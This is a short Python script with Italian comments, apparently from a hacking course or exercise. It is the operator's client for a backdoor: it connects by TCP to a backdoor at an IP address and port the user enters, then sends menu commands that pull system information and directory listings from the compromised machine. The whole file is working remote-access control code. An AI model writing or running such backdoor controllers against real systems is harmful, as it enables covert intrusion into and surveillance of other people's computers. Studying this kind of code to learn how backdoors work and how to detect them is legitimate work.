import socket as so
# link: https://docs.python.org/3/library/socket.html#module-socket

SRV_ADDR = input("Indirizzo IP della backdoor: ")
SRV_PORT = int(input("Porta della backdoor: "))

def print_menu():
    print("""\n\n0) Chiude la connessione
1) Informazioni sul sistema
2) Lista contenuti directory""")

# Prepara la funzione socket come ipv4 + tcp
s = so.socket(so.AF_INET, so.SOCK_STREAM)

# la connessione e' diretta non attendiamo
s.connect((SRV_ADDR, SRV_PORT))

print("connessione stabilita!")
print_menu()

while True:
    # chiediamo all'utente che vuole fare
    message = input("\n-Seleziona un opzione: ")
    if(message == "0"):
        s.sendall(message.encode())
        s.close()
        break
    elif(message == "1"):
        # invio alla backdoor 1
        s.sendall(message.encode())
        # attendo la risposta della backdoor
        data = s.recv(1024) # e' un po' il passo dei walkie-talkie
        if not data: break
        print(data.decode('utf-8'))
    elif(message == "2"):
        path = input("Inserici il percorso: ")
        # prima mando il comando
        s.sendall(message.encode())
        # poi mando il path
        s.sendall(path.encode())
        data = s.recv(1024)
        data = data.decode('utf-8').split(",")
        print("*"*40)
        for x in data: print(x)
        print("*"*40)
        
        


